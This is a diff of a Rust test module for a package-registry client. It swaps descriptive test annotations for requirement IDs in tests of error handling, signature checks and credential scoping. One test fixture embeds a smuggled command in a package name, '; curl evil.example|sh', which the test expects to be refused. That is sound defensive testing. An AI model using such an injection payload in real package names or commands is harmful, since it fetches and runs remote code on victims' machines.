@@ -417,10 +417,7 @@ mod tests {
             .map_err(|failure| error_of(failure, None, "http://r/x", subject, NOW))
     }
 
-    #[specforge_test_macros::test(
-        behavior = "search_registry",
-        verify = "a search reply holding a hit that is no package name or no SemVer version is that registry's failure, R009"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-030")]
     fn a_search_reply_with_a_hit_that_is_no_package_name_is_r009() {
         let body = br#"{"results":[{"name":"@sdk/greet; curl evil.example|sh","version":"9.9.9","description":""}]}"#;
         let error = read::<SearchResults>(body, "greet").unwrap_err();
@@ -440,10 +437,7 @@ mod tests {
         serde_json::to_string(&ErrorBody::new(ErrorCode::NotFound, message)).unwrap()
     }
 
-    #[specforge_test_macros::test(
-        behavior = "authenticate_registry_request",
-        verify = "every registry call reads an answer's status as one error"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-110")]
     fn every_call_reads_a_status_alike() {
         let read = |status: u16, retry_after: Option<&str>, body: &str| {
             failed(status, retry_after, body, "@acme/tool@1.0.0")
@@ -512,10 +506,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        behavior = "authenticate_registry_request",
-        verify = "403 response produces E-level diagnostic with permission guidance"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-110")]
     fn a_403_is_forbidden_whatever_the_call() {
         // §3 R2: the same 403 was R005 for a version list and R002 for one version.
         let body = error_body("token lacks scope @acme");
@@ -538,10 +529,7 @@ mod tests {
         }
     }
 
-    #[specforge_test_macros::test(
-        behavior = "publish_to_registry",
-        verify = "a registry's refusal reaches the publisher with its reason"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-030")]
     fn a_registry_refusal_is_its_own_error() {
         let body = serde_json::to_string(&ErrorBody::new(
             ErrorCode::UnsignedPackage,
@@ -571,10 +559,7 @@ mod tests {
         );
     }
 
-    #[specforge_test_macros::test(
-        behavior = "check_registry_reply",
-        verify = "a reply that is not the protocol's JSON is refused with R009, even with --allow-unsigned"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-030")]
     fn a_reply_that_is_not_the_protocols_json_is_refused() {
         let error = read::<PackageMetadata>(br#"{"name":"@a/b","version":"1.0.0"}"#, "@a/b@1.0.0")
             .unwrap_err();
@@ -590,10 +575,7 @@ mod tests {
         ));
     }
 
-    #[specforge_test_macros::test(
-        behavior = "check_registry_reply",
-        verify = "a reply that is not the protocol's JSON is refused with R009, even with --allow-unsigned"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-030")]
     fn a_malformed_signature_in_a_reply_is_refused_with_r009() {
         let body = br#"{"name":"@a/b","version":"1.0.0","sha256":"abababababababababababababababababababababababababababababababab","wasm_url":"/x","signature":{"sig":"x","public_key":"z","signed_at":"now"}}"#;
         let error = read::<PackageMetadata>(body, "@a/b@1.0.0").unwrap_err();
@@ -605,10 +587,7 @@ mod tests {
         assert_eq!(error.to_diagnostic().code, "R009");
     }
 
-    #[specforge_test_macros::test(
-        behavior = "check_registry_reply",
-        verify = "a 404 without the protocol's NOT_FOUND error is R009, not package not found"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-030")]
     fn a_bare_404_is_r009_naming_the_address() {
         let diagnostic = failed(404, None, "", "@acme/tool").to_diagnostic();
 
@@ -689,10 +668,7 @@ mod tests {
         (root, lines)
     }
 
-    #[specforge_test_macros::test(
-        behavior = "authenticate_registry_request",
-        verify = "a request carries a credential only to the registry root it was kept for"
-    )]
+    #[specforge_test_macros::test(requirement = "FEATURE-110")]
     fn a_credential_goes_only_to_its_own_root() {
         let (root, lines) = catcher();
         let registry = RegistryConfig {
